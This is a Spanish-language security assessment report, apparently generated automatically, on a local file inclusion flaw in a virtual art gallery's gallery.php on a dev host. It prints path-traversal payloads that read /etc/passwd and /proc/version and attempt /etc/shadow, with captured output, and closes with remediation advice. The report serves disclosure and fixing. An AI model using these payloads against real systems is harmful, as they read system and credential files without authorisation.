# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Objetivo:** http://web.dev.local:8081  
**Fecha:** 2026-04-30  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Resultado:** VULNERABILIDAD CONFIRMADA Y EXPLOTADA

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" alojada en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor sin autenticación.

---

## 2. Descripción de la Aplicación

La aplicación es una galería de arte virtual (`Galería de Arte Virtual`) que ofrece las siguientes secciones:

- Arte Moderno (`gallery.php?page=modern`)
- Arte Clásico (`gallery.php?page=classic`)
- Arte Abstracto (`gallery.php?page=abstract`)
- Acerca de (`gallery.php?page=about`)

---

## 3. Vulnerabilidad Encontrada

### 3.1 Local File Inclusion (LFI)

| Campo           | Detalle                                   |
|-----------------|-------------------------------------------|
| **URL afectada**| `http://web.dev.local:8081/gallery.php`   |
| **Parámetro**   | `page`                                    |
| **Tipo**        | Local File Inclusion (LFI)                |
| **Severidad**   | Crítica                                   |
| **CVSS**        | ~9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |

**Descripción:** El parámetro `page` en `gallery.php` es utilizado directamente en una función PHP `include()` sin sanitización ni validación, permitiendo incluir rutas arbitrarias del sistema mediante traversal de directorios (`../`).

El error revelado al intentar acceder a `/etc/shadow` confirma que se usa `include()` en la línea 104 de `/var/www/html/gallery.php`.

---

## 4. Explotación

### 4.1 Lectura de `/etc/passwd`

**Payload:**
```
GET /gallery.php?page=../../../../etc/passwd
```

**Resultado (extracto):**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

✅ **Explotación exitosa** — Se pudo leer el fichero `/etc/passwd` del servidor.

### 4.2 Intento de lectura de `/etc/shadow`

**Payload:**
```
GET /gallery.php?page=../../../../etc/shadow
```

**Resultado:** Permiso denegado. El proceso web (`www-data`) no tiene permisos de lectura sobre `/etc/shadow`, lo cual es el comportamiento esperado del sistema operativo.

### 4.3 Lectura de `/proc/version` (información del sistema)

**Payload:**
```
GET /gallery.php?page=../../../../proc/version
```

**Resultado:**
```
Linux version 6.8.0-110-generic (buildd@lcy02-amd64-115) 
(x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0, 
GNU ld (GNU Binutils for Ubuntu) 2.42) 
#110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026
```

✅ **Información del sistema operativo obtenida:** Ubuntu 24.04 con kernel 6.8.0-110-generic.

---

## 5. Información del Sistema Obtenida

| Dato                  | Valor                                      |
|-----------------------|--------------------------------------------|
| **Sistema operativo** | Ubuntu 24.04 (Noble Numbat)                |
| **Kernel**            | Linux 6.8.0-110-generic                    |
| **Compilador**        | GCC 13.3.0                                 |
| **Servidor web**      | Apache/PHP (`/var/www/html/gallery.php`)   |
| **Usuario web**       | www-data                                   |
| **Fichero fuente**    | `/var/www/html/gallery.php` (línea 104)    |

---

## 6. Causa Raíz

El código PHP vulnerable utiliza el valor del parámetro `page` directamente en una llamada `include()` sin validar ni sanitizar la entrada:

```php
// Código vulnerable (aproximado, línea 104 de gallery.php)
include($page);  // o include("pages/" . $page . ".php");
```

La ausencia de:
- Validación contra una lista blanca de páginas permitidas
- Sanitización de secuencias `../`
- Uso de `realpath()` para verificar que el fichero esté dentro del directorio permitido

...hace posible la inclusión de cualquier fichero legible por el proceso web.

---

## 7. Impacto

- **Confidencialidad:** ALTA — Exposición de ficheros sensibles del sistema (configuraciones, credenciales, código fuente, etc.)
- **Integridad:** BAJA — LFI por sí solo no permite escritura (sin RFI o log poisoning adicional)
- **Disponibilidad:** BAJA — No afecta directamente a la disponibilidad

---

## 8. Recomendaciones

1. **Lista blanca de páginas:** Validar el parámetro `page` contra un conjunto de valores permitidos:
   ```php
   $allowed = ['modern', 'classic', 'abstract', 'about'];
   if (!in_array($_GET['page'], $allowed)) {
       die('Página no encontrada');
   }
   include('pages/' . $_GET['page'] . '.php');
   ```

2. **Sanitización de entrada:** Eliminar secuencias `../` y caracteres especiales del parámetro.

3. **Configuración PHP:** Deshabilitar `allow_url_include` y revisar `open_basedir` para restringir el acceso al sistema de ficheros.

4. **Principio de mínimo privilegio:** Asegurarse de que el proceso web no tenga acceso de lectura a ficheros sensibles del sistema.

5. **Errores de PHP:** Deshabilitar la visualización de errores en producción (`display_errors = Off`).

---

## 9. Conclusión

La aplicación `gallery.php` presenta una vulnerabilidad **crítica de LFI** en el parámetro `page`. Esta vulnerabilidad fue explotada con éxito para leer ficheros del sistema (`/etc/passwd`, `/proc/version`). Se recomienda corregir urgentemente implementando una lista blanca de páginas válidas.

---

*Informe generado automáticamente mediante análisis de seguridad autorizado.*
